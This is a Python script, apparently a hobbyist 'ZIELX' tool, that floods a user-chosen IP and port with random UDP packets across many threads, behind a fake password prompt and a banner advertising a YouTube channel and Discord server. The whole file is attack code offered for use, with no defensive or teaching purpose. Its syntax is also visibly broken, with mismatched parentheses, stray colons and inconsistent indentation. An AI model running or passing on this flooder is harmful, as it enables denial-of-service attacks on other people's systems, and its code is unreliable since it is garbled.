import random
import socket
import time
import threading
import codecs, sys
import os

os.system("clear") 
password = input("\033]96m[•] ENTER PASSWORD : ") 
time.sleep(2)
print("\033[96m[...] WAIT FOR 5 SECOND!!! ") 
time.sleep(5) 
if password=="zielxv4":
	print("\033[94m[√] LOGIN SUCCESSFUL!!! ")
	time.sleep(3) 
os.system("clear") 
print('''\033[94m
███████╗██╗███████╗██╗░░░░░██╗░░██╗
╚════██║██║██╔════╝██║░░░░░╚██╗██╔╝
░░███╔═╝██║█████╗░░██║░░░░░░╚███╔╝░
██╔══╝░░██║██╔══╝░░██║░░░░░░██╔██╗░
███████╗██║███████╗███████╗██╔╝╚██╗
╚══════╝╚═╝╚══════╝╚══════╝╚═╝░░╚═╝
''') 
print("     >> TOOLS BY ZIELX") 
print("     >>> DONT FORGET TO SUBS MY YOUTUBE") 
print("     >>>> MY COMMUNITY discord.gg/treax") 


ip =str(input("[+] Enter Ip : ")) 
port =int(input("[-] Enter Port : ")) 
times =int(input("[•] Enter Times : ")) 
threads =int(input("[×] Enter Threads : ")) 
choice =str(input("[√] Ready? (yes/n) : ")) 

def run():
	   data = random._urandom(1024) 
	   i = random.choice(("[+]"," [-]","[•]")) 
	   while True:
		  try:
			  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
              addr = str(ip),int(port))
              for x in range (times):
              	s.sendto (data,addr) 
              print(f"\033[94mZieLx Attacking Ip \033[1;31;40m{ip} \033[94mPort \033[1;31;40m{port} !!! ") 
           except:
           	print(f"\033[94mZieLx Attacking Ip \033[1;31;40m{ip} \033[94mPort \033[1;31;40m{port} !!! ") 
           
def run2():
	data = random. _urandom(16) 
	i = random.choice(("[+]"," [-]","[•]")) 
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
			s.connect((ip,port)) 
			s.send(data) 
			for x in range (times):
				s.send(data) 
	         print(f"\033[94mZieLx Attacking Ip \033[1;31;40m{ip} \033[94mPort \033[1;31;40m{port} !!! ") 
	       except:
		     print(f"\033[94mZieLx Attacking Ip \033[1;31;40m{ip} \033[94mPort \033[1;31;40m{port} !!! ") 

for y in range(threads):
	if.choice == 'yes'
th = threading.Thread(target = run)
th.start():
	else
th = threading.Thread(target = run2) 
th.start():
	print("\033[1;31;40m[×] Wrong Password!!! ") 
           
              
              
              
              
